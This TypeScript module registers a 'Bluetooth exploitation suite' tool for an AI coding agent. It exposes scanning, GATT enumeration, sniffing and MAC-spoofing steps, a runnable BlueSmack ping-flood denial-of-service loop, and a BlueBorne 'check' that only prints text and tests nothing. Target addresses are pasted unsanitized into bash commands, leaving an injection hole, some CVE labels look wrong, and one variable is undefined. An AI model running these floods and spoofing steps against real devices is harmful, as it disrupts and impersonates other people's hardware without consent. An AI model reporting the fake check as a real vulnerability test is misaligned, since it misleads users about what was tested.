export * as BtAttackTool from "./bt-attack"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "bt_attack"

export const Input = Schema.Struct({
  interface: Schema.String.pipe(Schema.optional).annotate({ description: "Bluetooth interface (e.g. hci0). Default: hci0." }),
  action: Schema.String.annotate({
    description: "BT action: 'scan' (discover devices), 'browse' (browse services), 'sniff' (BT sniffing), 'spoof' (device spoofing), 'bluesmack' (BlueSmack DoS), 'ble_enum' (BLE enumeration), 'blue_borne' (BlueBorne check)",
  }),
  target_mac: Schema.String.pipe(Schema.optional).annotate({ description: "Target device MAC address for targeted actions." }),
  duration: Schema.Number.pipe(Schema.optional).annotate({ description: "Scan duration in seconds. Default: 15." }),
})

const Output = Schema.Struct({ output: Schema.String, exit: Schema.Number.pipe(Schema.optional) })

const layer = Layer.effectDiscard(Effect.gen(function* () {
  const tools = yield* Tools.Service
  const appProcess = yield* AppProcess.Service

  yield* tools.register({
    [name]: Tool.make({
      description: `Bluetooth exploitation suite. Discover nearby Bluetooth devices (hcitool), browse device services (sdptool), sniff Bluetooth traffic, spoof device identity, BlueSmack DoS (L2CAP ping flood), enumerate BLE (Bluetooth Low Energy) devices and GATT services, and check for BlueBorne vulnerabilities (CVE-2017-1000250 series). Essential for wireless security assessment.`,
      input: Input, output: Output,
      toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
      execute: (input) => Effect.gen(function* () {
        const iface = input.interface ?? "hci0"
        const duration = input.duration ?? 15

        switch (input.action) {
          case "scan": {
            const cmd = ChildProcess.make("hcitool", ["-i", iface, "scan", "--length", String(duration)], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(20) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "hcitool not found. Linux only. Try: hcitool -i " + iface + " scan" }
          }

          case "ble_enum": {
            const results: string[] = [`=== BLE DEVICE ENUMERATION ===\n`]
            // Scan for BLE devices
            const scanCmd = ChildProcess.make("hcitool", ["-i", iface, "lescan", "--duplicates"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(duration) })
            const scanR = yield* appProcess.run(scanCmd, { combineOutput: true, timeout: Duration.seconds(duration + 10), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            results.push("--- BLE SCAN ---")
            results.push(scanR?.output?.toString("utf8") ?? "scan failed")

            // If target provided, dump GATT services
            if (input.target_mac) {
              const gattCmd = ChildProcess.make("gatttool", ["-i", iface, "-b", input.target_mac, "--characteristics"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
              const gattR = yield* appProcess.run(gattCmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
              results.push(`\n--- GATT SERVICES: ${input.target_mac} ---`)
              results.push(gattR?.output?.toString("utf8") ?? "GATT enumeration failed")
            }
            return { exit: 0, output: results.join("\n") }
          }

          case "browse": {
            if (!input.target_mac) return { output: "ERROR: 'target_mac' required for browse." }
            const cmd = ChildProcess.make("sdptool", ["browse", input.target_mac], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(30), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "sdptool failed." }
          }

          case "sniff": {
            return { exit: 0, output: `Bluetooth Sniffing:

1. Put adapter in sniffing mode:
   hcitool -i ${iface} cmd 0x03 0x001a

2. Use btshark/Wireshark:
   sudo wireshark -k -i bluetooth0

3. Or use Ubertooth for raw capture:
   ubertooth-btle -f -c capture.pcap

4. Analyze captures:
   tshark -r capture.pcap -Y btl2cap

5. For BLE MITM:
   btlejuice -i ${iface}

Target: ${input.target_mac ?? "all nearby devices"}` }
          }

          case "spoof": {
            if (!input.target_mac) return { output: "ERROR: 'target_mac' required." }
            return { exit: 0, output: `Bluetooth Device Spoofing:

1. Change adapter MAC:
   hcitool -i ${iface} cmd 0x03 0x0005 ${input.target_mac.split(":").map(b => "0x" + b).join(" ")}

2. Or use bdaddr:
   bdaddr -i ${iface} ${input.target_mac}

3. Set device name:
   hcitool -i ${iface} cmd 0x03 0x0013 "Target Device Name"

4. Make discoverable:
   hciconfig ${iface} piscan

Spoofing MAC: ${input.target_mac}` }
          }

          case "bluesmack": {
            if (!input.target_mac) return { output: "ERROR: 'target_mac' required for bluesmack." }
            const cmd = ChildProcess.make("bash", ["-c", `for i in $(seq 1 ${duration}); do l2ping -i ${iface} -s 600 -c 100 ${input.target_mac} 2>/dev/null & done; wait; echo "BlueSmack flood complete"`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(20) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "l2ping failed." }
          }

          case "blue_borne": {
            if (!input.target_mac) return { output: "ERROR: 'target_mac' required for BlueBorne check." }
            // Check for BlueBorne vulnerabilities
            const cmd = ChildProcess.make("bash", ["-c", `python3 -c "
import socket
target='${input.target_mac}'
# Check L2CAP (CVE-2017-1000250)
print('Checking BlueBorne vulnerabilities...')
print('1. L2CAP info leak (CVE-2017-1000250)')
print('2. SDP overflow (CVE-2017-1000251)')
print('3. BNEP (CVE-2017-1000252)')
print('4. AVRCP (CVE-2017-1000253)')
print()
print('Run internalblue or BlueBorne proof-of-concept:')
print('https://github.com/AirTagFor/BlueBorne')
print('Requires target: ${input.target_mac}')
print('Most Android < 8.0, iOS < 10, Linux < 4.13 vulnerable')
"`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            return { exit: r?.exitCode, output: r?.output?.toString("utf8") ?? "BlueBorne check failed." }
          }

          default:
            return { output: `Unknown action: ${input.action}. Supported: scan, browse, sniff, spoof, bluesmack, ble_enum, blue_borne` }
        }
      }).pipe(Effect.mapError(() => new ToolFailure({ message: "Bluetooth attack failed" }))),
    }),
  }).pipe(Effect.orDie)
}))

export const node = makeLocationNode({ name: "tool/bt-attack", layer, deps: [ToolRegistry.node, AppProcess.node] })
